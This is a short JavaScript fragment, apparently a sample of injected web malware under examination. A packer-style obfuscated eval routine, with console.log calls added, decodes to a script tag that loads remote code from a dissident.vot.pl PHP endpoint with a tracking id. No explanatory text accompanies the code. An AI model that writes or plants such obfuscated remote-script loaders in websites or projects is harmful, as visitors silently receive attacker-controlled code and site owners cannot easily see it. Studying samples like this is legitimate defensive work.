eval(
	function(p,a,c,k,e,r){

		e=function(c){
			return c.toString(a)
		};



		if( !''.replace(/^/,String) ){
			while(c--){
				r[e(c)]=k[c]||e(c);
				//console.log(r[e(c)]);
			}

			k=[function(e){return r[e]}];

			e=function(){return'\\w+'};

			c=1
		};

		while(c--)
			if(k[c]){
				console.log(p);
				p = p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
				
			}
		
		return p
	}
	('<0 6="2/3"4="5://c.7.8/9.a?b=1"></0>',13,13,'script|83036096|text|javascript|src|http|type|vot|pl|3dvmBTz9|php|id|dissident'.split('|'),0,{})
)